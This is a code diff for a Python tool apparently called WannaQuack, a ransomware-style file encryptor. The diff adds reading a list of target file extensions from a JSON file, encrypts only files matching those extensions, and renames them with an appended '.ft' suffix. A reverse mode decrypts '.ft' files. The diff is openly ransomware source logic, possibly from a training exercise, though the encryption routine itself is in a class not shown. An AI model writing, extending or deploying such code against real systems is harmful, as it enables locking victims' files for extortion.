@@ -1,3 +1,4 @@
+import json
 import argparse
 from WannaQuack import WannaQuack
 from Worker import Worker
@@ -18,6 +19,16 @@ def init_parser():
         "-s", "--silent", action="store_true", help="Silent mode, no output"
     )
     return parser
+
+
+def get_all_extentions():
+    try:
+        with open("file_extensions.json", "r") as f:
+            data = json.load(f)
+            return set(data)
+    except Exception as e:
+        print(f"Error: {e}")
+        return None
 
 
 def print_error(e, duck_killer):
@@ -41,6 +52,9 @@ def main():
 
     duck_file_killer = WannaQuack(args)
     duck_file_killer.password = ask_for_password()
+    file_extentions = get_all_extentions()
+    if not file_extentions:
+        return 1
 
     ret = duck_file_killer.get_all_files()
     if not ret:
@@ -65,12 +79,19 @@ def main():
             try:
                 with open(file, "rb") as f:
                     data = f.read()
+                    file_extention = os.path.splitext(file)[1]
                     if args.reverse:
+                        print("Decrypting", file_extention)
+                        if file_extention != ".ft":
+                            continue
                         new_content = duck_file_killer.decrypt(data)
                         out_path = Path(file).with_suffix("")
                     else:
+                        if file_extention not in file_extentions:
+                            continue
                         new_content = duck_file_killer.encrypt(data)
-                        out_path = Path(file).with_suffix(".ft")
+                        out_path = Path(file)
+                        out_path = out_path.with_suffix(out_path.suffix + ".ft")
 
             except Exception as e:
                 print_error(f"File Error on read {e}", duck_file_killer)
